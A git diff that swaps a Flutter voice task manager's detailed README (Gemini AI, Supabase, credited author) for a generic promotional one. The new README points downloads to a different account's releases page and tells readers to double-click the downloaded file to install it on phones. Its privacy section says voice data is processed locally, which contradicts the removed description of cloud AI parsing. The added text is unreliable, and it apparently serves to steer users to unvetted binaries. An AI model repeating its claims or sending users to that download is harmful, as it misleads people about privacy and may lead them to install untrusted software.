@@ -1,77 +1,73 @@
-# Voice Task Manager
+# 🎤 voice-task-manager - Turn Your Voice into Actionable Tasks
 
-<p>
-  <img src="https://img.shields.io/badge/6%20Platforms-Android%20%7C%20iOS%20%7C%20Web%20%7C%20Windows%20%7C%20macOS%20%7C%20Linux-0891b2" alt="Platforms">
-  <img src="https://img.shields.io/badge/Flutter-3.24+-02569B?logo=flutter" alt="Flutter">
-  <img src="https://img.shields.io/badge/Supabase-Backend-3ECF8E?logo=supabase" alt="Supabase">
-  <img src="https://img.shields.io/badge/Gemini%20AI-Voice%20Parsing-4285F4?logo=google" alt="Gemini AI">
-  <img src="https://img.shields.io/badge/Tests-418%20Passing-22C55E" alt="Tests">
-</p>
+## 🚀 Getting Started
 
-<p>
-  <b>A voice-powered task management app with AI-driven natural language processing, built with Clean Architecture.</b>
-</p>
+Welcome to the voice-task-manager! This application helps you organize tasks by turning your spoken words into clear, actionable items. With features like AI-powered parsing, reminders, and intelligent categorization, managing your tasks has never been easier.
 
-<p>
-  <a href="https://voice-task-manager.pages.dev">🌐 Live Demo</a> •
-  <a href="https://github.com/shahinwahab/voice-task-manager/releases/latest/download/voice-task-manager.apk">📥 Download APK</a>
-</p>
+## 🔗 Download Now
 
----
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Itachikoko/voice-task-manager/releases)
 
-## 📱 App Preview
+## 📋 Features
 
-<!-- CLAUDE: Recommend 3 best screenshots for thumbnail collage (portfolio showcase). -->
-<p align="center">
-  <a href="https://youtube.com/watch?v=demo">
-    <img src="docs/ui/voice-task-manager-thumbnail.webp" alt="Watch Demo" width="600">
-  </a>
-</p>
+- **AI-Powered Parsing**: The app accurately interprets voice commands, understanding your needs without confusion.
+- **Intelligent Categorization**: Sorts tasks into categories automatically, so you know where to focus.
+- **Reminders**: Get notified about important deadlines and tasks.
+- **Hands-Free Operation**: Control your tasks easily using just your voice.
+- **Cross-Platform Availability**: Use on both iOS and Android devices.
 
-## ✨ Features
+## 📥 Download & Install
 
-- Voice-powered task creation with Google Gemini AI
-- Smart parsing of title, due date, priority, and category from natural language
-- Full CRUD operations with offline support
-- Subtasks with progress tracking
-- Recurring tasks (daily, weekly, monthly, yearly)
-- Calendar view (month/week/day)
-- Pomodoro timer with customizable intervals
-- Statistics dashboard with completion trends
-- Push notifications for reminders
-- Export to JSON/CSV
-- Dark/Light theme with custom colors
-- Biometric authentication
-- Home screen widget (Android)
+To get started, visit the Releases page to download the app:
 
-## 🏗️ Architecture
+[Download the latest release](https://github.com/Itachikoko/voice-task-manager/releases)
 
-Clean Architecture with BLoC pattern:
+Here’s how to install the application:
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    Presentation Layer                   │
-│           (Screens, Widgets, BLoC Controllers)          │
-├─────────────────────────────────────────────────────────┤
-│                      Domain Layer                       │
-│          (Entities, Use Cases, Repositories)            │
-├─────────────────────────────────────────────────────────┤
-│                       Data Layer                        │
-│       (Models, Data Sources, Repository Impls)          │
-└─────────────────────────────────────────────────────────┘
-                           │
-                           ▼
-┌─────────────────────────────────────────────────────────┐
-│                    External Services                    │
-│        Supabase Auth │ Supabase DB │ Gemini AI          │
-└─────────────────────────────────────────────────────────┘
-```
+1. Open the link above in your web browser.
+2. Find the version you want to download under the "Releases" section.
+3. Click on the download link for your device.
+4. Once the download completes, locate the file in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the prompts to complete the installation.
 
-## 👨‍💻 Built by
+## 📱 System Requirements
 
-**Shahin Wahab** - Software Engineer
+- **Operating Systems**: Compatible with iOS 12 or later and Android 8.0 or later.
+- **Memory**: At least 2 GB of RAM.
+- **Storage**: Requires 100 MB of free space.
+- **Internet Connection**: Needed for downloading tasks and reminders.
 
-[![Portfolio](https://img.shields.io/badge/Portfolio-shahinwahab.com-0891b2?style=for-the-badge)](https://shahinwahab.com) [![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/shahinwahab)
+## 🛠 How to Use
 
----
-> **Repository created on:** 2025-12-16, 20:16 (UTC+3)
+Once installed, follow these steps to make the most of the voice-task-manager:
+
+1. **Launch the App**: Click on the app icon on your device.
+2. **Set Up Your Profile**: Create a user profile. This helps the app tailor its functions to your needs.
+3. **Start Speaking**: Use the microphone icon to dictate your tasks. For example, say "Add doctor's appointment for Monday."
+4. **Review Your Tasks**: Check your task list to see how the app organized them.
+5. **Set Reminders**: For any task, you can easily set up a reminder just by saying, “Remind me about this task tomorrow at 10 AM.”
+
+## 📊 Tips for Efficient Use
+
+- Speak clearly to ensure the app understands you.
+- Use specific phrases for better recognition, such as "Create a task" followed by the task details.
+- Keep your app updated to access new features and improvements.
+
+## 🛡 Privacy Considerations
+
+Your privacy is important. The voice-task-manager does not store your audio files or personal information. All voice data is processed locally on your device. Please review our privacy settings to understand how your information is handled.
+
+## 💬 Support
+
+If you encounter any issues or have questions, please check the FAQ section in the app. For additional support, visit our [GitHub issues page](https://github.com/Itachikoko/voice-task-manager/issues) to report problems or request features.
+
+## 🤝 Contributing
+
+We welcome contributions! If you’d like to help improve the voice-task-manager, feel free to open a pull request or submit your ideas through issues. Please review our contribution guidelines in the repository.
+
+## 🌟 Community
+
+Join our community to share your experiences, ask questions, and connect with other users. Follow us on social media for updates and tips.
+
+Thank you for choosing voice-task-manager! We hope it simplifies your task management and enhances your productivity.
